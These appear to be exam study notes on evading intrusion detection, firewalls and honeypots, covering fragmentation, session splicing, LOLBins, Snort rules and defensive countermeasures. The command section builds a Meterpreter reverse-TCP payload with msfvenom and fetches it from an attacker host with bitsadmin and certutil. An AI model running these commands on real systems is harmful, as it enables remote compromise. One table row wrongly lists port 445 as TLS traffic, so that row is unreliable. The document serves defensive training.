# Module 12: Evading IDS, Firewalls, and Honeypots

## Tier 1: Core Concepts & Principles

### Architectural Definitions & Defense In Depth
* **Intrusion Detection System (IDS):** Security software/hardware that passively monitors network traffic or host activities to detect unauthorized access, policy violations, or known attack signatures, raising real-time alerts.
* **Intrusion Prevention System (IPS):** An inline network security device that actively inspects, analyzes, and blocks/drops malicious network traffic in real time.
* **Firewalls:** Hardware or software boundaries that control inbound and outbound network traffic based on predetermined security rules (packet filtering, stateful inspection, proxy/application-level).
* **Honeypots:** Decoy systems intentionally deployed to attract attackers, record their techniques, gather threat intelligence, and divert malicious traffic away from critical production assets.

### IDS & IPS Detection Categories
* **Signature-Based Detection:** Matches network packet payloads against a static database of pre-compiled threat signatures. Effective against known threats; useless against zero-days.
* **Anomaly-Based Detection:** Establishes a baseline of normal network/host behavior and triggers alerts when current metrics deviate statistically from the baseline. Effective for zero-days; prone to high false-positive rates.
* **Protocol Analysis / Stateful Inspection:** Validates traffic adherence to standardized RFC protocol specs and state tracking (e.g., verifying proper TCP handshake state).

### Honeypot Classifications
* **By Interaction Level:**
  * **Low-Interaction Honeypots:** Emulate only specific services/ports (e.g., HoneyBOT). Minimal risk, easy to deploy, limited data collection.
  * **High-Interaction Honeypots:** Run real OS environments and actual services (e.g., Cowrie SSH/Telnet honeypot). High forensic data collection, higher operational risk if fully compromised.
* **By Purpose:**
  * **Production Honeypots:** Deployed alongside production servers to act as early-warning intrusion detectors.
  * **Research Honeypots:** Used by security researchers to study adversary TTPs (Tactics, Techniques, and Procedures).

---

## Tier 2: Technical Analysis & Mechanics

### Evasion Tactics & Technical Mechanics

| Evasion Technique | Technical Execution Mechanism | Target Defensive Control | Primary Mitigation / Countermeasure |
| :--- | :--- | :--- | :--- |
| **IP Packet Fragmentation** | Splitting IP packets into small fragment blocks so signature engines miss the complete attack signature across packet boundaries. | Stateless / Simple NIDS | Enforce IP packet reassembly (Normalize packets) before signature evaluation. |
| **TTL Manipulation / Overlapping Fragments** | Sending fragments with varying Time-To-Live (TTL) values so the IDS sees one payload while the end host reassembles a different payload. | Signature Engines & Packet Inspection | Modern NIDS/NIPS normalizers unify TTL processing and drop overlapping fragments. |
| **Session Splicing** | Breaking network payloads across tiny TCP segments (1 byte per segment) or inserting deliberate delays to bypass pattern-matching buffer windows. | Buffer/Stream-based NIDS signatures | Implement full TCP stream reassembly and stateful inspection. |
| **HTTP Obfuscation & Encoding** | Encoding attack strings using URL Encoding (`%20`), Unicode, Double Hex, or Directory Traversal variations (`/..;/`, `/./`). | Web Application Firewalls (WAF) & NIDS | Normalize URL requests (decode hex/Unicode) prior to rule execution. |
| **LOLBins (Living off the Land)** | Abusing legitimate Windows administrative utilities (e.g., `BITSAdmin`, `Certutil`, `PowerShell`) to download payloads over allowed outbound ports (`80/443`). | Perimeter Firewalls & Egress Filtering | Application Control / AppLocker / WDAC, endpoint behavior monitoring, blocking unauthorized parent-child processes. |
| **SSL/TLS Encryption** | Encrypting attack traffic over TLS (HTTPS/Port 445/Port 22) so perimeter inspection systems cannot read the payload. | Unencrypted Packet Filters / NIDS | Deploy SSL/TLS Decryption Inspection (Forward Proxies) and endpoint EDR. |

### Snort NIDS Engine Rules & Structure
* **Snort Rule Header Syntax:** 
  `action proto src_ip src_port direction dst_ip dst_port (rule_options)`
* **Rule Actions:** `alert`, `log`, `pass`, `activate`, `dynamic`, `drop` (IPS mode), `reject`.
* **Critical Snort Rule Options:**
  * `msg:"<text>"` : Text message displayed in log/alert output.
  * `sid:<number>` : Snort Rule ID (1–99: Reserved; 100–999,999: Built-in; $\ge 1,000,000$: Local custom rules).
  * `rev:<number>` : Rule revision count.
  * `classtype:<type>` : Categorizes the rule alert priority.
  * `content:"<string>"` : Searches packet payload for exact string matches (supports Hex via `|XX XX|`).
  * `itype:<number>` / `icode:<number>` : Filters specific ICMP packet types/codes (e.g., `itype:8` for ICMP Echo Request).

---

## Tier 3: CLI, Tools & Framework Syntax

### Core Security & Evasion Tooling
* **Snort:** Open-source Network Intrusion Detection/Prevention System (NIDS/NIPS).
* **Cowrie:** High-interaction SSH and Telnet honeypot designed to log brute-force attacks and shell interactions.
* **BITSAdmin / Certutil:** Windows native LOLBin CLI utilities used to manage Background Intelligent Transfer Service jobs and certificate operations (abused for payload downloads).
* **MSFVenom:** Metasploit payload generation framework used to craft reverse shells and executable payloads.

### Key Commands & Execution Syntax

```bash
# Snort NIDS Mode: Check available network interfaces (Windows/Linux)
snort -W

# Snort Execution: Run in NIDS alert mode using custom rules configuration file
snort -dev -i 1 -c /etc/snort/snort.conf -l /var/log/snort -A console

# Example Custom Snort Rule (Alert on inbound ICMP Echo Request Ping):
# Place in /etc/snort/rules/local.rules
alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:"ICMP Ping Detected"; itype:8; icode:0; sid:1000001; rev:1;)

# MSFVenom: Generate a Windows Meterpreter Reverse TCP Payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe

# Apache Web Server: Start service to host malicious payload
sudo systemctl start apache2
# Copy payload to web root
sudo cp payload.exe /var/www/html/payload.exe

# BITSAdmin Evasion: Download remote payload over HTTP via native Windows LOLBin
bitsadmin /transfer myDownloadJob /download /priority foreground [http://192.168.1.100/payload.exe](http://192.168.1.100/payload.exe) C:\Users\Public\payload.exe

# Certutil Alternative Evasion Download Command
certutil -urlcache -split -f [http://192.168.1.100/payload.exe](http://192.168.1.100/payload.exe) C:\Users\Public\payload.exe

# Cowrie Honeypot: View real-time attacker session logs
tail -f /var/log/cowrie/cowrie.log
```

---

## Tier 4: Real-World Scenarios & Countermeasures

### Defensive Mitigations & Evasion Defenses
* **LOLBin & Egress Filtering Hardening:**
  * Restrict execution of administrative binaries (`bitsadmin.exe`, `certutil.exe`, `powershell.exe`) for standard unprivileged users using **AppLocker** or **Windows Defender Application Control (WDAC)**.
  * Enable **Process Creation Auditing (Event ID 4688)** and **Sysmon Event ID 1 (Process Creation)** to monitor command-line parameters (e.g., alerting on `bitsadmin /transfer` or `certutil -urlcache`).
* **NIDS Traffic Normalization:** Deploy inline traffic normalizers on IPS appliances to reassemble fragmented IP packets and TCP streams before running signature matching engines.
* **SSL/TLS Decryption & Inspection:** Implement perimeter SSL/TLS interception proxies to inspect encrypted outbound/inbound web traffic for malicious payloads.
* **Honeypot Network Deployment:**
  * Isolate honeypots inside dedicated Demilitarized Zones (DMZ) or isolated VLANs with strict outbound routing firewalls to prevent compromised honeypots from pivoting into internal production networks.
  * Ingest honeypot log streams directly into a SIEM (Security Information and Event Management) system for real-time threat intelligence gathering and early warning alerts.

---

## Tier 5: Exam Key Hooks & Rapid Triggers

| Concept / Mechanism | High-Yield Exam Trigger | Critical Distinction |
| :--- | :--- | :--- |
| **IDS vs. IPS** | IDS = Out-of-band / Passive alert; IPS = Inline / Active blocking | IDS alerts only; IPS sits inline to actively drop/block packets |
| **Anomaly Detection** | Triggers on statistical deviation from a established baseline | Best for zero-day attacks; produces high false positive rates |
| **Signature Detection** | Matches packet payloads against known threat database | Fast and accurate for known threats; useless against zero-days |
| **Low-Interaction Honeypot** | Emulates specific ports/services (e.g., HoneyBOT) | Low risk, easy deployment, captures minimal attacker behavior |
| **High-Interaction Honeypot** | Runs actual OS and services (e.g., Cowrie) | Captures complete shell commands/payloads; higher risk |
| **Session Splicing** | Transmits payload 1 byte per TCP packet | Evades simple signature buffers that do not reassemble streams |
| **LOLBin (BITSAdmin / Certutil)** | Native Windows binary abused to download payloads over HTTP | Evades perimeter firewalls by abusing trusted OS components |
| **Snort Rule SID $\ge 1,000,000$** | Custom local user-defined Snort rules | SID numbers under 1,000,000 are reserved for built-in rules |
| **Snort `itype:8`** | Filters ICMP Echo Request packets (Ping) | Used in custom rules to detect Ping sweeps/ICMP probes |
| **Dynamic Packet Filtering** | Stateful inspection tracking active TCP connection states | Evaluates IP/Port headers AND connection state table |
| **Application Firewall (Proxy)** | Filters traffic at Layer 7 (Application layer) | Inspects protocol payload (HTTP/HTTPS commands), not just headers |
| **Firewalking** | Probe firewall ACL rules via TTL expiration (`TTL + 1`) | Identifies internal router hops behind firewalls using ICMP Type 11 |